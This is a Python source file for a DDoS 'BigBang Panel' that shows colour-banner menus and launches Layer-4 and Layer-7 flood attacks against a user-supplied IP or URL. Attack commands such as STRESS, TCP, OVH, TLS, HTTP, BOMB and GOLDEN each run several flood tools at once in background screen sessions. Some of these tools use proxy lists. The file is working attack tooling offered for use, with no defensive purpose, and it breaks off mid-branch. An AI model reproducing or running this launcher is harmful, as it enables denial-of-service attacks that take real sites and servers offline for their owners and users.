# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

def layer7():
	os.system ("clear")
	print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'

\033[37m[ LAYER - 7 ]
\033[35mNOTE USE:
METHODE [URL] [PORT] [TIME]

\033[37m – STRIKE   – TLSV3 
 – BOMB2    – JAVA
 – BOMB     – HTTP
 – GOLDEN   – MIX
 – UAM 
 – TLS 
 – TLSV2

""")

def layer12():
	os.system ("clear")
	print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'

\033[37m[ LAYER - 12 ]
\033[35mUSE FOR BOT COUNT

\033[37m– BRUTAL [url] [time]
– BOT [url] [time]
– BOT2 [url] [time]

""")

def VVIP():
	os.system ("clear")
	print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'

\033[37m[ VVIP ]
\033[35mNOTE USE:
METHODE [URL] [PORT] [TIME]

\033[37m– HTTPS
– HTTPS2
– BYPASS
– BROWSER
– KILLNET

""")

def layer4():
	os.system ("clear")
	print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'

\033[37m[ LAYER - 4 ]
\033[35mNOTE USE: 
mode   [1/2/3]
method [GET/POST/HEAD]
            

\033[37m – STRESS [ip] [port] [mode] [time]
 – TCP [ip] [port] [time] [method]
 – OVH [ip] [port] [time] [method]


""")    

def help():
	os.system ("clear")
	print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'

\033[37m[ MENU BIGBANG-PANNEL ]
HOW TO USE TYPE L7 OR L4 TO SEE COMMANDS

[LAYER-7]       [LAYER-4]       [LAYER-12]      [VVIP]
\033[35m• STRIKE        • STRESS        • BRUTAL        • HTTPS [\033[32mVVIP\033[35m]
• BOMB2         • TCP           • BOT           • HTTPS2 [\033[32mVVIP\033[35m]
• BOMB          • OVH           • BOT2 [\033[32mVIP\033[35m]    • BYPASS [\033[32mVVIP\033[35m]
• GOLDEN                                        • BROWSER [\033[32mVVIP\033[35m]
• UAM                                           • KILLNET [\033[32mVVIP\033[35m]
• TLS [\033[32mVIP\033[35m]
• TLSV2 [\033[32mVIP\033[35m]
• TLSV3 [\033[32mVIP\033[35m]
• JAVA
• HTTP [\033[32mVIP\033[35m]
• MIX [\033[32mVIP\033[35m]

""")

def menu():
    os.system ("clear")
    print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'


\x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " HELP " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
""")



def main():

	while True:
		sys.stdout.write(f"\x1b]2;[/] BigBang Pannel :: Server Online 500 :: Online 1 :: Running: 0/10\x07")
		sin = input("\033[0;30;45mBigBang@PANNEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			menu()
		if sinput == "cls" or sinput == "CLS":
			os.system ("pkill screen")
			os.system ("clear")
			menu()
		if sinput == "stop" or sinput == "STOP":
			os.system ("pkill screen")
			menu()			
		if sinput == "layer12" or sinput == "l12" or sinput == ".layer12" or sinput == "LAYER12" or sinput == ".LAYER12" or sinput == "L12":
			layer12()
		if sinput == "vvip" or sinput == "vip" or sinput == ".vvip" or sinput == "VVIP" or sinput == ".VVIP" or sinput == "VIP":
			VVIP()
		if sinput == "layer7" or sinput == "l7" or sinput == ".layer7" or sinput == "LAYER7" or sinput == ".LAYER7" or sinput == "L7":
			layer7()
		if sinput == "layer4" or sinput == "l4" or sinput == ".layer4" or sinput == "LAYER4" or sinput == ".LAYER4" or sinput == "L4":
			layer4()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()

#########LAYER-4########
		elif sinput == "stress" or sinput == "STRESS":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				method = sin.split()[3]
				time = sin.split()[4]
				os.system(f'cd .resources && go run stress.go {ip} {port} {method} 1250 {time} 5')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
\033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mSTRESSER \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tcp" or sinput == "TCP":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd .resources && screen -dm ./TCP {method} {ip} {port} {time} 15000')
				os.system(f'cd .TC1 && screen -dm ./TCP {method} {ip} {port} {time} 7000')
				os.system(f'cd .TC2 && screen -dm ./TCP {method} {ip} {port} {time} 10000')
				os.system(f'cd .resources && screen -dm./RAW {method} {ip} {port} {time} 15000')
				os.system(f'cd .TC1 && screen -dm ./RAW {method} {ip} {port} {time} 7000')
				os.system(f'cd .TC2 && screen -dm ./RAW {method} {ip} {port} {time} 10000')
				os.system(f'cd /media && screen -dm ./RAW {method} {ip} {port} {time} 7000')
				os.system(f'cd /media && screen -dm ./TCP {method} {ip} {port} {time} 7000')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mTCP \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "ovh" or sinput == "OVH":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd .resources && ./RAW {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mOVH \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()

#########LAYER-7########  
		elif sinput == "strike" or sinput == "STRIKE":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .resources && screen -dm go run strike.go -url {host} GET')
				os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
				os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 8 1')
				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 8 1')
				os.system(f'cd /media && screen -dm go run strike.go -url {host} GET')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mSTRIKE \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "java" or sinput == "JAVA":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .randomstring && cd examples && java input2.java {host} 8000')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mJAVA \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls" or sinput == "TLS":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 300 5 500')
				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 64 8')
				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 45 5 500')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[\033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLS \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bot" or sinput == "BOT":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
				os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
				os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
				os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')
				os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
				os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBOT \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "brutal" or sinput == "BRUTAL":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')				
				os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
				os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
				os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
				os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
				os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBRUTAL \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tlsv2" or sinput == "TLSV2":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 8 1')
				os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 32 5 500')
				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 32 1')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV2 \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tlsv3" or sinput == "TLSV3":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 64 GET proxy.txt 16')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 32 GET proxy.txt 16')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 300 5 500')
				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')  
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV3 \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "http" or sinput == "HTTP":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
				os.system(f'cd .godzilla && screen -dm node HTTP-RAND.js {host} {time}')
				os.system(f'cd .malware && screen -dm node HTTP-RAND.js {host} {time}')
				os.system(f'cd .malware && screen -dm node HTTP.js {host} 300 8 {time}')
				os.system(f'cd /media && screen -dm node HTTP.js {host} 300 8 {time}')
				os.system(f'cd /media && screen -dm node HTTP-RAND.js {host} {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mHTTP \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bomb2" or sinput == "BOMB2":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
				os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data GET')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB2 \033[35m]
\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bomb" or sinput == "BOMB":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .resources && screen -dm go run Low.go -site {host} -data POST')
				os.system(f'cd /media && screen -dm go run Low.go -site {host} -data GET')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB \033[35m]
\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "golden" or sinput == "GOLDEN":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .resources && python3 goldeneye.py {host} -w 10 -s 500 -m random -d True')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET    : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME      : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT      : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                LAYER-7   : \033[35m[ \033[1;37mGOLDEN \033[35m]
\033[1;37m                VIP       : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER      : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "https" or sinput == "HTTPS":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 8 500')		
				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 5 128')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 32')
				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 5 128')
